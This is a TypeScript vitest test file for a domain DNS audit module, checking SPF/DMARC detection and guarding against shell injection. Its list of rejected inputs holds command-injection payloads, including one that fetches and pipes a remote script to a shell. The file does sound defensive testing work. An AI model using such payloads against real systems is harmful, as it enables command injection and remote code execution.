import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { beforeEach, describe, expect, it, vi } from "vitest";

const spawnSpies = vi.hoisted(() => ({
  exec: vi.fn(),
  execSync: vi.fn(),
  spawn: vi.fn(),
  spawnSync: vi.fn(),
  execFile: vi.fn(),
  execFileSync: vi.fn(),
}));
const resolverSpy = vi.hoisted(() => vi.fn());

vi.mock("node:child_process", () => spawnSpies);
vi.mock("node:dns/promises", () => ({
  Resolver: class {
    resolveTxt = resolverSpy;
  },
}));

import {
  auditDomainDns,
  extractCleanDomain,
  isValidDomainName,
  type TxtResolver,
} from "../lead-investigation";

const dnsError = (code: string) => Object.assign(new Error(code), { code });

function fakeResolver(table: Record<string, string[][] | string>): TxtResolver {
  return vi.fn(async (host: string) => {
    const entry = table[host];
    if (entry === undefined) throw dnsError("ENOTFOUND");
    if (typeof entry === "string") throw dnsError(entry);
    return entry;
  });
}

const MALICIOUS = [
  "a.com$(id)",
  "a.com;id",
  "a.com`id`",
  "a.com && curl evil.sh | sh",
  "a.com|id",
  "a.com\nid",
  "$(touch /tmp/pwned).com",
  "a.com'id'",
  "-a.com",
  "a..com",
  "localhost",
  "127.0.0.1",
  "",
];

describe("isValidDomainName", () => {
  it("accepts normal hostnames", () => {
    for (const d of ["northstar.com", "mail.example.co.uk", "a-b.io", "xn--bcher-kva.example", "x.xn--p1ai"]) {
      expect(isValidDomainName(d)).toBe(true);
    }
  });

  it("rejects shell metacharacters, IPs and malformed names", () => {
    for (const d of MALICIOUS) expect(isValidDomainName(d)).toBe(false);
    expect(isValidDomainName("Example.com")).toBe(false); // must be pre-lowercased
    expect(isValidDomainName(`${"a".repeat(64)}.com`)).toBe(false);
    expect(isValidDomainName(null)).toBe(false);
  });
});

describe("extractCleanDomain", () => {
  it("normalizes valid websites and emails", () => {
    expect(extractCleanDomain("https://www.Northstar.com/about")).toBe("northstar.com");
    expect(extractCleanDomain("northstar.com:8443")).toBe("northstar.com");
    expect(extractCleanDomain(null, "maya@Ledgerline.io")).toBe("ledgerline.io");
    expect(extractCleanDomain(null, "maya@gmail.com")).toBe("");
  });

  it("returns empty for injection payloads", () => {
    expect(extractCleanDomain("https://a.com$(id)")).toBe("");
    expect(extractCleanDomain("a.com;id")).toBe("");
    expect(extractCleanDomain("a.com`id`")).toBe("");
    expect(extractCleanDomain(null, "x@a.com$(id)")).toBe("");
  });
});

describe("auditDomainDns", () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it("rejects injection payloads without any lookup or process spawn", async () => {
    for (const d of MALICIOUS) {
      const resolver = vi.fn();
      await expect(auditDomainDns(d, resolver as unknown as TxtResolver)).resolves.toEqual({ hasDefect: false });
      expect(resolver).not.toHaveBeenCalled();
    }
    // Default resolver path must not be touched either.
    await auditDomainDns("a.com$(id)");
    await auditDomainDns("a.com;id");
    expect(resolverSpy).not.toHaveBeenCalled();
    for (const spy of Object.values(spawnSpies)) expect(spy).not.toHaveBeenCalled();
  });

  it("uses node:dns (not a shell) for valid domains", async () => {
    resolverSpy.mockImplementation(async (host: string) =>
      host.startsWith("_dmarc.") ? [["v=DMARC1; p=none"]] : [["v=spf1 include:_spf.google.com ~all"]]
    );
    await expect(auditDomainDns("northstar.com")).resolves.toEqual({ hasDefect: false });
    expect(resolverSpy).toHaveBeenCalledWith("_dmarc.northstar.com");
    expect(resolverSpy).toHaveBeenCalledWith("northstar.com");
    for (const spy of Object.values(spawnSpies)) expect(spy).not.toHaveBeenCalled();
  });

  it("flags missing DMARC on NXDOMAIN / no data / no v=DMARC1", async () => {
    for (const dmarc of ["ENOTFOUND", "ENODATA", [["something else"]]] as const) {
      const result = await auditDomainDns(
        "acme.com",
        fakeResolver({ "_dmarc.acme.com": dmarc as any, "acme.com": [["v=spf1 -all"]] })
      );
      expect(result.hasDefect).toBe(true);
      expect(result.description).toContain("DMARC");
    }
  });

  it("joins chunked TXT records", async () => {
    const result = await auditDomainDns(
      "acme.com",
      fakeResolver({ "_dmarc.acme.com": [["v=DMA", "RC1; p=reject"]], "acme.com": [["v=sp", "f1 -all"]] })
    );
    expect(result).toEqual({ hasDefect: false });
  });

  it("flags missing SPF", async () => {
    const result = await auditDomainDns(
      "acme.com",
      fakeResolver({ "_dmarc.acme.com": [["v=DMARC1; p=none"]], "acme.com": [["google-site-verification=x"]] })
    );
    expect(result.hasDefect).toBe(true);
    expect(result.description).toContain("SPF");
  });

  it("does not report a defect on transient resolver errors", async () => {
    const result = await auditDomainDns(
      "acme.com",
      fakeResolver({ "_dmarc.acme.com": "ETIMEOUT", "acme.com": "ESERVFAIL" })
    );
    expect(result).toEqual({ hasDefect: false });
  });

  it("source no longer references child_process", () => {
    const src = readFileSync(fileURLToPath(new URL("../lead-investigation.ts", import.meta.url)), "utf8");
    expect(src).not.toMatch(/child_process|execSync|nslookup/);
  });
});
